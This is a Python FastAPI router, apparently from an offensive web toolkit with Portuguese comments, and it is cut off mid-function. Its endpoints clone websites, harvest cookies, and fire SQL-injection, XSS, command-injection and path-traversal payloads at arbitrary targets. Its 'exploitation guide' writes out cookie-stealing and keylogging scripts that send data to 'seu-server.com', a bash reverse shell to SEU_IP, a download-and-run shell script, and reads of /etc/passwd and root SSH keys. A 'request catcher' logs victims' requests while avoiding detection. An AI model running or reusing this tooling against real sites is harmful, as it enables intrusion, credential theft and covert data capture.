from fastapi import APIRouter, UploadFile, File, HTTPException, Request
from fastapi.responses import JSONResponse, Response
import requests
from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS
import io
from datetime import datetime
import base64
import aiohttp
import asyncio
from bs4 import BeautifulSoup
from typing import List, Dict
from security_middleware import validate_url_input, security_validator

router = APIRouter()

# 🛡️ Tamanho máximo de arquivo (10MB)
MAX_FILE_SIZE = 10 * 1024 * 1024

def extract_exif(image_data):
    """Extract EXIF data from image"""
    try:
        image = Image.open(io.BytesIO(image_data))
        exif_data = {}
        
        exif = image._getexif()
        if not exif:
            return {"error": "No EXIF data found"}
        
        # Extract basic info
        for tag_id, value in exif.items():
            tag = TAGS.get(tag_id, tag_id)
            
            # Handle GPS data
            if tag == "GPSInfo":
                gps_data = {}
                for gps_tag_id, gps_value in value.items():
                    gps_tag = GPSTAGS.get(gps_tag_id, gps_tag_id)
                    gps_data[gps_tag] = gps_value
                
                # Convert GPS to decimal degrees
                if "GPSLatitude" in gps_data and "GPSLongitude" in gps_data:
                    lat = gps_data["GPSLatitude"]
                    lon = gps_data["GPSLongitude"]
                    
                    lat_deg = float(lat[0]) + float(lat[1])/60 + float(lat[2])/3600
                    lon_deg = float(lon[0]) + float(lon[1])/60 + float(lon[2])/3600
                    
                    if gps_data.get("GPSLatitudeRef") == "S":
                        lat_deg = -lat_deg
                    if gps_data.get("GPSLongitudeRef") == "W":
                        lon_deg = -lon_deg
                    
                    exif_data["gps"] = {
                        "lat": round(lat_deg, 6),
                        "lng": round(lon_deg, 6)
                    }
            else:
                exif_data[tag] = str(value)
        
        return exif_data
    except Exception as e:
        return {"error": str(e)}

@router.post("/extract-exif")
async def extract_exif_endpoint(file: UploadFile = File(...)):
    """Extract EXIF metadata from uploaded image with security validation"""
    try:
        # 🛡️ Validar tipo de arquivo
        allowed_types = ["image/jpeg", "image/jpg", "image/png", "image/gif", "image/bmp", "image/tiff"]
        if file.content_type not in allowed_types:
            raise HTTPException(status_code=400, detail=f"Tipo de arquivo não permitido: {file.content_type}")
        
        # 🛡️ Validar nome do arquivo
        is_valid, error = security_validator.validate_filename(file.filename)
        if not is_valid:
            raise HTTPException(status_code=400, detail=error)
        
        # 🛡️ Validar tamanho
        contents = await file.read()
        if len(contents) > MAX_FILE_SIZE:
            raise HTTPException(status_code=400, detail=f"Arquivo muito grande (máximo {MAX_FILE_SIZE / 1024 / 1024}MB)")
        
        exif_data = extract_exif(contents)
        
        # Get image basic info
        image = Image.open(io.BytesIO(contents))
        
        result = {
            "camera": exif_data.get("Model", "Unknown"),
            "date": exif_data.get("DateTime", "Unknown"),
            "gps": exif_data.get("gps", {"lat": None, "lng": None}),
            "settings": {
                "iso": exif_data.get("ISOSpeedRatings", "Unknown"),
                "aperture": exif_data.get("FNumber", "Unknown"),
                "shutter": exif_data.get("ExposureTime", "Unknown"),
                "focal": exif_data.get("FocalLength", "Unknown")
            },
            "software": exif_data.get("Software", "Unknown"),
            "resolution": f"{image.width} x {image.height}",
            "size": f"{len(contents) / 1024:.2f} KB",
            "format": image.format
        }
        
        return result
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

import base64
import zipfile
import asyncio
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

@router.post("/clone-website")
async def clone_website(data: dict):
    """Clone website HTML e opcionalmente cria um ZIP completo com assets e sub-páginas"""
    try:
        url = data.get("url")
        clone_subpages = data.get("clone_subpages", False)
        
        if not url:
            raise HTTPException(status_code=400, detail="URL is required")
            
        validated_url = validate_url_input(url)
        parsed_base = urlparse(validated_url)
        base_domain = parsed_base.netloc
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
        }
        
        async def fetch_page(session, fetch_url):
            try:
                async with session.get(fetch_url, headers=headers, timeout=aiohttp.ClientTimeout(total=15), ssl=False) as resp:
                    if resp.status == 200 and 'text/html' in resp.headers.get('Content-Type', ''):
                        text = await resp.text()
                        return text, resp.url
            except Exception:
                pass
            return None, None

        async def fetch_asset(session, asset_url):
            try:
                async with session.get(asset_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as resp:
                    if resp.status == 200:
                        content = await resp.read()
                        # Só baixar arquivos razoáveis (max 2MB por asset)
                        if len(content) <= 2 * 1024 * 1024:
                            return content
            except Exception:
                pass
            return None

        async with aiohttp.ClientSession() as session:
            # 1. Fetch Main Page
            main_html, final_url = await fetch_page(session, validated_url)
            if not main_html:
                raise HTTPException(status_code=400, detail="Falha ao carregar a página principal ou não é um HTML válido.")
                
            soup = BeautifulSoup(main_html, 'html.parser')
            
            # Preparar ZIP em memória
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                # 2. Coletar Assets (CSS, JS, Imagens locais básicas)
                assets_to_download = {}
                
                # CSS
                for link in soup.find_all('link', rel='stylesheet'):
                    href = link.get('href')
                    if href:
                        abs_url = str(urljoin(str(final_url), href))
                        filename = f"assets/css_{len(assets_to_download)}.css"
                        assets_to_download[abs_url] = filename
                        link['href'] = filename  # Re-escrever o HTML local
                        
                # JS
                for script in soup.find_all('script', src=True):
                    src = script.get('src')
                    if src:
                        abs_url = str(urljoin(str(final_url), src))
                        filename = f"assets/js_{len(assets_to_download)}.js"
                        assets_to_download[abs_url] = filename
                        script['src'] = filename
                        
                # Imagens (limitado src diretos inline rápidos)
                for img in soup.find_all('img', src=True):
                    src = img.get('src')
                    if src and not src.startswith('data:'):
                        abs_url = str(urljoin(str(final_url), src))
                        ext = abs_url.split('.')[-1][:4] if '.' in abs_url else 'png'
                        # clean ext
                        ext = ''.join(c for c in ext if c.isalnum())
                        filename = f"assets/img_{len(assets_to_download)}.{ext}"
                        assets_to_download[abs_url] = filename
                        img['src'] = filename

                # Baixar Assets Paralelamente
                asset_tasks = [fetch_asset(session, url) for url in assets_to_download.keys()]
                downloaded_assets = await asyncio.gather(*asset_tasks)
                
                for idx, (url, filepath) in enumerate(assets_to_download.items()):
                    content = downloaded_assets[idx]
                    if content:
                        zip_file.writestr(filepath, content)
                
                # Tratar links das sub-páginas (Absolutos vs Relativos)
                subpages = {}
                if clone_subpages:
                    for a in soup.find_all('a', href=True):
                        href = a.get('href')
                        if href and not href.startswith('#') and not href.startswith('javascript:') and not href.startswith('mailto:'):
                            abs_url = str(urljoin(str(final_url), href))
                            p_url = urlparse(abs_url)
                            # Se for o mesmo domínio e não for a raiz
                            if p_url.netloc == base_domain and p_url.path and p_url.path != '/':
                                slug = p_url.path.strip('/').replace('/', '_')
                                if not slug: slug = "index_page"
                                filename = f"{slug}.html"
                                if abs_url not in subpages and len(subpages) < 15: # Máximo 15 sub-páginas
                                    subpages[abs_url] = filename
                                    a['href'] = filename
                
                # Fazer download de Sub-páginas
                if clone_subpages and subpages:
                    sub_tasks = [fetch_page(session, url) for url in subpages.keys()]
                    downloaded_subs = await asyncio.gather(*sub_tasks)
                    for idx, (url, filepath) in enumerate(subpages.items()):
                        sub_html, _ = downloaded_subs[idx]
                        if sub_html:
                            # Parse minimal to fix paths
                            sub_soup = BeautifulSoup(sub_html, 'html.parser')
                            zip_file.writestr(filepath, str(sub_soup))
                            
                # Salvar o index principal atualizado
                index_html = str(soup)
                zip_file.writestr("index.html", index_html)
                
            # Finalizar o ZIP
            zip_buffer.seek(0)
            zip_b64 = base64.b64encode(zip_buffer.read()).decode('utf-8')
            
            return {
                "html": index_html,
                "status": 200,
                "size": len(index_html),
                "zip_base64": zip_b64,
                "pages_cloned": 1 + len(subpages) if clone_subpages else 1,
                "assets_cloned": len(assets_to_download)
            }
            
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@router.post("/analyze-face")
async def analyze_face(file: UploadFile = File(...)):
    """Analyze face in image with security validation"""
    try:
        # 🛡️ Validar tipo de arquivo
        allowed_types = ["image/jpeg", "image/jpg", "image/png", "image/gif"]
        if file.content_type not in allowed_types:
            raise HTTPException(status_code=400, detail=f"Tipo de arquivo não permitido: {file.content_type}")
        
        # 🛡️ Validar tamanho
        contents = await file.read()
        if len(contents) > MAX_FILE_SIZE:
            raise HTTPException(status_code=400, detail=f"Arquivo muito grande (máximo {MAX_FILE_SIZE / 1024 / 1024}MB)")
        
        image = Image.open(io.BytesIO(contents))
        
        # This would integrate with face-api.js or similar
        # For now, return structure for frontend to use
        return {
            "faces": 1,
            "width": image.width,
            "height": image.height,
            "format": image.format
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@router.post("/reverse-image-search")
async def reverse_image_search(data: dict):
    """Perform reverse image search across multiple engines and return aggregated results"""
    try:
        image_url = data.get("imageUrl")
        if not image_url:
            raise HTTPException(status_code=400, detail="Image URL is required")
        
        engines = [
            {
                "name": "Google Images",
                "url": f"https://images.google.com/searchbyimage?image_url={image_url}",
                "search_url": f"https://www.google.com/searchbyimage?image_url={image_url}&encoded_image=&image_content=&filename=&hl=en"
            },
            {
                "name": "Yandex Images", 
                "url": f"https://yandex.com/images/search?rpt=imageview&url={image_url}",
                "search_url": f"https://yandex.com/images/search?rpt=imageview&url={image_url}"
            },
            {
                "name": "Bing Images",
                "url": f"https://www.bing.com/images/search?view=detailv2&iss=sbi&form=SBIIRP&sbisrc=UrlPaste&q=imgurl:{image_url}",
                "search_url": f"https://www.bing.com/images/search?view=detailv2&iss=sbi&form=SBIIRP&sbisrc=UrlPaste&q=imgurl:{image_url}"
            },
            {
                "name": "TinEye",
                "url": f"https://tineye.com/search?url={image_url}",
                "search_url": f"https://tineye.com/search?url={image_url}"
            }
        ]
        
        async def fetch_engine_results(session: aiohttp.ClientSession, engine: Dict) -> Dict:
            """Fetch results from a single search engine"""
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                }
                
                async with session.get(engine["search_url"], headers=headers, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                    if response.status == 200:
                        html = await response.text()
                        
                        # Parse results based on engine
                        results_found = 0
                        snippet = ""
                        
                        if engine["name"] == "Google Images":
                            if "Best guess for this image" in html or "Pages that include matching images" in html:
                                results_found = html.count('<div class="g">')
                                soup = BeautifulSoup(html, 'html.parser')
                                guess = soup.find(string=lambda text: text and "Best guess" in text)
                                if guess:
                                    snippet = guess.strip()[:200]
                        
                        elif engine["name"] == "Yandex Images":
                            if "Similar images" in html or "Sites" in html:
                                results_found = html.count('serp-item')
                        
                        elif engine["name"] == "Bing Images":
                            if "Image results" in html or "Related" in html:
                                results_found = html.count('iusc')
                        
                        elif engine["name"] == "TinEye":
                            soup = BeautifulSoup(html, 'html.parser')
                            match_count = soup.find(class_='matches')
                            if match_count:
                                text = match_count.get_text()
                                import re
                                numbers = re.findall(r'\d+', text)
                                if numbers:
                                    results_found = int(numbers[0])
                        
                        return {
                            "engine": engine["name"],
                            "status": "success",
                            "results_found": results_found if results_found > 0 else "Unknown",
                            "url": engine["search_url"],
                            "snippet": snippet if snippet else "Resultados encontrados",
                            "available": results_found > 0 or "Similar" in html or "match" in html.lower()
                        }
                    else:
                        return {
                            "engine": engine["name"],
                            "status": "error",
                            "results_found": 0,
                            "url": engine["search_url"],
                            "snippet": f"HTTP {response.status}",
                            "available": False
                        }
            except asyncio.TimeoutError:
                return {
                    "engine": engine["name"],
                    "status": "timeout",
                    "results_found": 0,
                    "url": engine["search_url"],
                    "snippet": "Timeout ao buscar resultados",
                    "available": False
                }
            except Exception as e:
                return {
                    "engine": engine["name"],
                    "status": "error",
                    "results_found": 0,
                    "url": engine["search_url"],
                    "snippet": str(e)[:100],
                    "available": False
                }
        
        # Fetch all engines in parallel
        async with aiohttp.ClientSession() as session:
            tasks = [fetch_engine_results(session, engine) for engine in engines]
            results = await asyncio.gather(*tasks)
        
        return {
            "imageUrl": image_url,
            "engines": results,
            "totalEngines": len(engines),
            "successfulSearches": sum(1 for r in results if r["available"])
        }
        
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))



@router.post("/exploit-tester")
async def exploit_tester(data: dict):
    """Teste automatizado de exploração com múltiplos payloads selecionados pelo usuário"""
    try:
        target = data.get("target")
        payloads = data.get("payloads", [])
        mode = data.get("mode", "custom")
        
        # 🛡️ Validar URL do target
        validated_target = validate_url_input(target)
        
        # Se payloads for lista vazia ou None, tentar pegar payload único (retrocompatibilidade)
        if not payloads:
            single_payload = data.get("payload")
            if single_payload:
                payloads = [single_payload]
        
        if not payloads or len(payloads) == 0:
            raise HTTPException(status_code=400, detail="Pelo menos 1 payload é obrigatório")
        if not payloads or len(payloads) == 0:
            raise HTTPException(status_code=400, detail="Pelo menos 1 payload é obrigatório")
        
        # 🛡️ Limitar número de payloads (max 50 para não sobrecarregar)
        if len(payloads) > 50:
            raise HTTPException(status_code=400, detail="Máximo de 50 payloads por teste")
        
        # Resultados agregados
        all_results = []
        vulnerable_payloads = []
        exploit_types_detected = set()
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        # Testar cada payload fornecido pelo usuário
        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                # Detectar tipo de exploit
                exploit_type = detect_exploit_type(payload)
                exploit_types_detected.add(exploit_type)
                
                try:
                    start_time = asyncio.get_event_loop().time()
                    
                    # Testar GET com payload
                    test_url = f"{validated_target}?test={payload}"
                    async with session.get(test_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                        response_time = int((asyncio.get_event_loop().time() - start_time) * 1000)
                        content = await response.text()
                        
                        # Análise de vulnerabilidade
                        is_vulnerable = analyze_vulnerability(payload, content, response.status, exploit_type)
                        
                        if is_vulnerable:
                            vulnerable_payloads.append(payload)
                        
                        all_results.append({
                            "payload": payload,
                            "exploitType": exploit_type,
                            "method": "GET",
                            "status": response.status,
                            "responseTime": response_time,
                            "vulnerable": is_vulnerable,
                            "responseLength": len(content)
                        })
                except Exception as e:
                    all_results.append({
                        "payload": payload,
                        "exploitType": exploit_type,
                        "method": "GET",
                        "status": 0,
                        "responseTime": 0,
                        "vulnerable": False,
                        "error": str(e)[:100]
                    })
        
        # Análise final
        vulnerable = len(vulnerable_payloads) > 0
        
        if vulnerable:
            # Pegar tipo de exploit mais comum
            main_exploit_type = max(exploit_types_detected, key=lambda x: sum(1 for r in all_results if r.get('exploitType') == x and r.get('vulnerable')))
            confidence = calculate_confidence(all_results)
            mitigation = generate_mitigation(main_exploit_type)
            
            return {
                "vulnerable": True,
                "exploitTypes": list(exploit_types_detected),
                "mainExploitType": main_exploit_type,
                "confidence": confidence,
                "totalTested": len(payloads),
                "vulnerableCount": len(vulnerable_payloads),
                "analysis": f"⚠️ SISTEMA VULNERÁVEL! Detectadas {len(vulnerable_payloads)} vulnerabilidades de {len(payloads)} payloads testados. "
                           f"Tipos de ataque detectados: {', '.join(exploit_types_detected)}. "
                           f"Confiança: {confidence}%.",
                "vulnerablePayloads": vulnerable_payloads,
                "allResults": all_results,
                "mitigation": mitigation
            }
        else:
            return {
                "vulnerable": False,
                "exploitTypes": list(exploit_types_detected),
                "totalTested": len(payloads),
                "vulnerableCount": 0,
                "analysis": f"✓ Sistema testado com {len(payloads)} payloads diferentes. "
                           f"Tipos testados: {', '.join(exploit_types_detected)}. "
                           f"Nenhuma vulnerabilidade foi detectada. O sistema parece estar protegido.",
                "allResults": all_results,
                "message": "Sistema aparentemente seguro contra os ataques testados."
            }
            
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


def detect_exploit_type(payload: str) -> str:
    """Detecta automaticamente o tipo de exploit baseado no payload"""
    payload_lower = payload.lower()
    
    if "'" in payload or "or" in payload_lower or "union" in payload_lower or "select" in payload_lower:
        return "SQL Injection"
    elif "<script" in payload_lower or "alert(" in payload_lower or "onerror" in payload_lower:
        return "XSS (Cross-Site Scripting)"
    elif ";" in payload or "|" in payload or "&" in payload or "`" in payload:
        return "Command Injection"
    elif "../" in payload or "..%2f" in payload_lower or "etc/passwd" in payload_lower:
        return "LFI/Path Traversal"
    elif "{{" in payload or "${" in payload or "<%=" in payload:
        return "SSTI (Template Injection)"
    else:
        return "Generic Injection"


def generate_payload_variations(payload: str, exploit_type: str) -> list:
    """Gera variações inteligentes do payload baseado no tipo"""
    variations = [payload]
    
    if exploit_type == "SQL Injection":
        variations.extend([
            payload,
            payload.replace("'", '"'),
            payload + " --",
            payload + " #",
            payload + "/*",
            f"admin{payload}",
            f"1{payload}",
            payload.replace(" ", "/**/"),
            payload.upper(),
            payload.lower()
        ])
    elif exploit_type == "XSS (Cross-Site Scripting)":
        variations.extend([
            payload,
            payload.replace("<", "%3C").replace(">", "%3E"),
            payload.replace("script", "ScRiPt"),
            f'"><script>alert(1)</script>',
            f"'><script>alert(1)</script>",
            f'<img src=x onerror={payload.replace("<script>", "").replace("</script>", "")}>',
            f'<svg/onload={payload.replace("<script>", "").replace("</script>", "")}>',
        ])
    elif exploit_type == "Command Injection":
        variations.extend([
            payload,
            f"; {payload}",
            f"| {payload}",
            f"& {payload}",
            f"&& {payload}",
            f"|| {payload}",
            f"`{payload}`",
            f"$({payload})",
        ])
    
    return list(set(variations))[:10]  # Limitar a 10 variações


def analyze_vulnerability(payload: str, response: str, status: int, exploit_type: str) -> bool:
    """Analisa se a resposta indica vulnerabilidade"""
    response_lower = response.lower()
    
    if exploit_type == "SQL Injection":
        sql_indicators = [
            "sql syntax", "mysql", "postgresql", "ora-", "microsoft sql",
            "unclosed quotation", "syntax error", "database error",
            "warning: mysql", "error in your sql", "sqlite_error"
        ]
        return any(indicator in response_lower for indicator in sql_indicators)
    
    elif exploit_type == "XSS (Cross-Site Scripting)":
        # Verifica se o payload foi refletido sem sanitização
        return payload in response or payload.replace("<", "&lt;") not in response
    
    elif exploit_type == "Command Injection":
        cmd_indicators = [
            "root:", "/bin/bash", "uid=", "gid=", "sh:", 
            "command not found", "permission denied"
        ]
        return any(indicator in response_lower for indicator in cmd_indicators)
    
    elif exploit_type == "LFI/Path Traversal":
        lfi_indicators = [
            "root:x:", "/etc/passwd", "bin/bash", "nobody:",
            "failed to open stream", "no such file"
        ]
        return any(indicator in response_lower for indicator in lfi_indicators)
    
    return False


def calculate_confidence(results: list) -> int:
    """Calcula confiança baseado nos resultados"""
    vulnerable_count = sum(1 for r in results if r.get('vulnerable', False))
    total = len(results)
    
    if vulnerable_count == 0:
        return 0
    
    base_confidence = int((vulnerable_count / total) * 100)
    
    # Ajustar baseado em múltiplos indicadores
    if vulnerable_count > 3:
        base_confidence = min(95, base_confidence + 10)
    
    return base_confidence


def generate_exploitation_guide(exploit_type: str, target: str, payload: str) -> dict:
    """Gera guia de exploração automatizado"""
    guides = {
        "SQL Injection": {
            "guide": "SQL Injection permite extrair, modificar ou deletar dados do banco de dados. "
                    "Você pode usar UNION SELECT para extrair dados de outras tabelas.",
            "steps": [
                f"1. Use o payload: {payload} para confirmar a injeção",
                "2. Descubra o número de colunas: ' ORDER BY 1-- (aumente até dar erro)",
                "3. Use UNION SELECT NULL,NULL,... com o número correto de colunas",
                "4. Identifique colunas visíveis: UNION SELECT 1,2,3,...",
                "5. Extraia dados: ' UNION SELECT username,password FROM users--",
                "6. Use information_schema para mapear o banco: ' UNION SELECT table_name FROM information_schema.tables--"
            ]
        },
        "XSS (Cross-Site Scripting)": {
            "guide": "XSS permite executar JavaScript no navegador da vítima. "
                    "Você pode roubar cookies, redirecionar usuários, ou modificar a página.",
            "steps": [
                f"1. Injete o payload: {payload}",
                "2. Para roubar cookies: <script>fetch('//seu-server.com?c='+document.cookie)</script>",
                "3. Para keylogging: <script>document.onkeypress=function(e){fetch('//seu-server.com?k='+e.key)}</script>",
                "4. Para phishing: <script>document.body.innerHTML='<h1>Login</h1>....'</script>",
                "5. Persistente: Armazene em banco se refletido em múltiplas páginas"
            ]
        },
        "Command Injection": {
            "guide": "Command Injection permite executar comandos do sistema operacional no servidor. "
                    "Você pode listar arquivos, ler dados sensíveis, ou obter shell reverso.",
            "steps": [
                f"1. Teste básico: {payload}",
                "2. Liste diretórios: ; ls -la",
                "3. Leia arquivos: ; cat /etc/passwd",
                "4. Shell reverso: ; bash -i >& /dev/tcp/SEU_IP/4444 0>&1",
                "5. Baixe ferramentas: ; wget http://seu-server.com/shell.sh",
                "6. Execute: ; chmod +x shell.sh && ./shell.sh"
            ]
        },
        "LFI/Path Traversal": {
            "guide": "LFI permite ler arquivos arbitrários do servidor. "
                    "Pode expor código-fonte, credenciais, chaves SSH, etc.",
            "steps": [
                f"1. Teste básico: {payload}",
                "2. Leia passwd: ../../../../etc/passwd",
                "3. Leia configurações: ../../../../etc/config/database.yml",
                "4. Código-fonte: ../../../../var/www/html/index.php",
                "5. Logs: ../../../../var/log/apache2/access.log",
                "6. Chaves SSH: ../../../../root/.ssh/id_rsa"
            ]
        }
    }
    
    return guides.get(exploit_type, {
        "guide": "Exploit genérico detectado. Analise a resposta do servidor para determinar o impacto.",
        "steps": ["1. Analise as respostas", "2. Teste variações", "3. Documente achados"]
    })


def generate_mitigation(exploit_type: str) -> str:
    """Gera recomendações de correção"""
    mitigations = {
        "SQL Injection": """
        ✓ Use prepared statements/parameterized queries (NUNCA concatene SQL)
        ✓ Use ORM (SQLAlchemy, Django ORM, etc) que escapa automaticamente
        ✓ Valide e sanitize TODAS as entradas do usuário
        ✓ Use least privilege: banco com permissões mínimas
        ✓ Desabilite mensagens de erro detalhadas em produção
        ✓ Implemente WAF (Web Application Firewall)
        """,
        "XSS (Cross-Site Scripting)": """
        ✓ Escape TODA saída HTML usando funções apropriadas (htmlspecialchars, DOMPurify)
        ✓ Use Content Security Policy (CSP) headers
        ✓ Valide entrada no servidor (whitelist de caracteres)
        ✓ Use frameworks que escapam automaticamente (React, Vue)
        ✓ Set HttpOnly e Secure flags em cookies
        ✓ Implemente X-XSS-Protection header
        """,
        "Command Injection": """
        ✓ NUNCA execute comandos do sistema com input do usuário
        ✓ Use bibliotecas nativas ao invés de shell (subprocess.run com shell=False)
        ✓ Whitelist de comandos permitidos
        ✓ Valide e sanitize RIGOROSAMENTE qualquer input
        ✓ Execute com usuário de menor privilégio possível
        ✓ Use containers/sandboxing para isolar execução
        """,
        "LFI/Path Traversal": """
        ✓ NUNCA use input do usuário diretamente em caminhos de arquivo
        ✓ Use whitelist de arquivos permitidos
        ✓ Valide paths com realpath() e verifique se está no diretório permitido
        ✓ Remova ../ e caracteres especiais
        ✓ Use chroot jail ou containers
        ✓ Desabilite allow_url_include no PHP
        """
    }
    
    return mitigations.get(exploit_type, "Implemente validação rigorosa de entrada e princípio do menor privilégio.")

@router.post("/extract-cookies")
async def extract_cookies(data: dict):
    """Extrai cookies e cabeçalhos de segurança de uma URL"""
    try:
        url = data.get("url")
        if not url:
            raise HTTPException(status_code=400, detail="URL é obrigatória")
        
        # Validate URL
        validated_url = validate_url_input(url)
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        
        async with aiohttp.ClientSession(cookie_jar=aiohttp.DummyCookieJar()) as session:
            # allow_redirects=True to follow redirects and gather more cookies
            async with session.get(validated_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10), ssl=False, allow_redirects=True) as response:
                
                # Extrair cookies do objeto de resposta (Set-Cookie headers processados)
                cookies_list = []
                for cookie_name, cookie_morsel in response.cookies.items():
                    cookies_list.append({
                        "name": cookie_name,
                        "value": cookie_morsel.value,
                        "domain": cookie_morsel.get('domain', ''),
                        "path": cookie_morsel.get('path', '/'),
                        "secure": cookie_morsel.get('secure', False),
                        "httponly": cookie_morsel.get('httponly', False),
                        "samesite": cookie_morsel.get('samesite', 'None'),
                        "expires": cookie_morsel.get('expires', '')
                    })
                    
                # Extrair Cabeçalhos Relevantes
                relevant_headers = {}
                security_headers = [
                    'server', 'x-powered-by', 'strict-transport-security', 
                    'content-security-policy', 'x-frame-options', 'x-content-type-options',
                    'x-xss-protection', 'access-control-allow-origin'
                ]
                
                for key, val in response.headers.items():
                    if key.lower() in security_headers or key.lower().startswith('x-'):
                        relevant_headers[key] = val
                
                server_name = response.headers.get('Server', 'Desconhecido')
                
                return {
                    "url": validated_url,
                    "status_code": response.status,
                    "server": server_name,
                    "cookies": cookies_list,
                    "headers": relevant_headers
                }
                
    except asyncio.TimeoutError:
        raise HTTPException(status_code=408, detail="Timeout ao tentar se conectar ao servidor alvo.")
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Erro ao capturar cookies: {str(e)}")

@router.post("/web-scraper")
async def web_scraper(data: dict):
    """Realiza web scraping avançado extraindo HTML, CSS, JS, Imagens, Vídeos, URLs e Cookies"""
    try:
        url = data.get("url")
        if not url:
            raise HTTPException(status_code=400, detail="URL é obrigatória")
        
        validated_url = validate_url_input(url)
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9"
        }
        
        async with aiohttp.ClientSession(cookie_jar=aiohttp.DummyCookieJar()) as session:
            async with session.get(validated_url, headers=headers, timeout=aiohttp.ClientTimeout(total=15), ssl=False, allow_redirects=True) as response:
                
                content_type = response.headers.get('Content-Type', '')
                if 'text/html' not in content_type:
                    raise HTTPException(status_code=400, detail=f"O alvo não retornou HTML. Tipo recebido: {content_type}")
                
                html_content = await response.text()
                soup = BeautifulSoup(html_content, 'html.parser')
                
                # Extract CSS (Inline + External)
                css_links = [link.get('href') for link in soup.find_all('link', rel='stylesheet') if link.get('href')]
                inline_styles = [style.get_text() for style in soup.find_all('style') if style.get_text().strip()]
                
                # Extract JS (Inline + External)
                js_links = [script.get('src') for script in soup.find_all('script') if script.get('src')]
                inline_scripts = [script.get_text() for script in soup.find_all('script') if not script.get('src') and script.get_text().strip()]
                
                # Extract Media (Images, Videos, Audio)
                images = [img.get('src') for img in soup.find_all('img') if img.get('src')]
                videos = [v.get('src') for v in soup.find_all(['video', 'source']) if v.get('src')]
                
                # Detect embedded videos (YouTube, Vimeo, etc) in iframes
                for iframe in soup.find_all('iframe'):
                    src = iframe.get('src', '')
                    if 'youtube.com' in src or 'vimeo.com' in src or 'dailymotion.com' in src or 'player' in src.lower() or 'embed' in src.lower():
                        videos.append(src)
                        
                # Extract Meta Content
                metadata = {}
                title_tag = soup.find('title')
                if title_tag:
                    metadata['title'] = title_tag.get_text(strip=True)
                for meta in soup.find_all('meta'):
                    name = meta.get('name', meta.get('property', ''))
                    _content = meta.get('content')
                    if name and _content:
                        metadata[name] = _content
                        
                # Extract Links/URLs
                links = []
                for a in soup.find_all('a', href=True):
                    href = a.get('href')
                    if href and not href.startswith('#') and not href.startswith('javascript:'):
                        links.append({
                            "text": a.get_text(strip=True)[:50],
                            "href": href
                        })
                
                # Extract Cookies
                cookies_list = []
                for cookie_name, cookie_morsel in response.cookies.items():
                    cookies_list.append({
                        "name": cookie_name,
                        "value": cookie_morsel.value,
                        "domain": cookie_morsel.get('domain', ''),
                        "path": cookie_morsel.get('path', '/'),
                        "secure": cookie_morsel.get('secure', False),
                        "httponly": cookie_morsel.get('httponly', False)
                    })
                
                from urllib.parse import urljoin
                
                # Format to Absolute URLs helper
                def make_absolute(url_list):
                    return list(set(urljoin(str(response.url), u) for u in url_list))
                
                return {
                    "target_url": str(response.url),
                    "status_code": response.status,
                    "server": response.headers.get('Server', 'Desconhecido'),
                    "metadata": metadata,
                    "cookies": cookies_list,
                    "html": {
                        "content": html_content,
                        "length": len(html_content)
                    },
                    "assets": {
                        "css_files": make_absolute(css_links),
                        "inline_css": inline_styles,
                        "js_files": make_absolute(js_links),
                        "inline_js": inline_scripts,
                        "images": make_absolute(images),
                        "videos": make_absolute(videos)
                    },
                    "links": links
                }
                
    except asyncio.TimeoutError:
        raise HTTPException(status_code=408, detail="Timeout ao carregar a página alvo.")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Falha no Scraping: {str(e)}")

# ==========================================
# REQUEST CATCHER (BURACO NEGRO)
# ==========================================

import uuid
from datetime import datetime

# InMemory Storage para Logs do Request Catcher (idealmente iria pro BD, mas para performance em memória fica mais rápido)
catcher_sessions = {}

@router.post("/catcher/generate")
async def generate_catcher_url(request: Request):
    """Gera um token único para o Request Catcher"""
    token = str(uuid.uuid4())[:8] # Cria um ID curto de 8 caracteres
    catcher_sessions[token] = []
    
    # Monta a URL base baseada no request atual
    base_url = str(request.base_url).rstrip("/")
    capture_url = f"{base_url}/api/tools/catch/{token}"
    
    return {"token": token, "capture_url": capture_url}

@router.get("/catcher/logs/{token}")
async def get_catcher_logs(token: str):
    """Retorna os logs capturados para um token específico"""
    if token not in catcher_sessions:
        raise HTTPException(status_code=404, detail="Sessão não encontrada ou expirada.")
    
    return {"token": token, "logs": catcher_sessions[token]}

@router.api_route("/catch/{token}", methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"])
async def catch_request(token: str, request: Request):
    """Endpoint Mágico que intercepta tudo enviado pela vítima"""
    if token not in catcher_sessions:
        # Retorna algo neutro se o token não existir (evita detecção)
        return {"status": "ok"}
        
    try:
        body = await request.body()
        body_text = body.decode('utf-8', errors='ignore') if body else None
    except:
        body_text = "<binary or empty>"
        
    log_entry = {
        "timestamp": datetime.now().isoformat(),
        "method": request.method,
        "url": str(request.url),
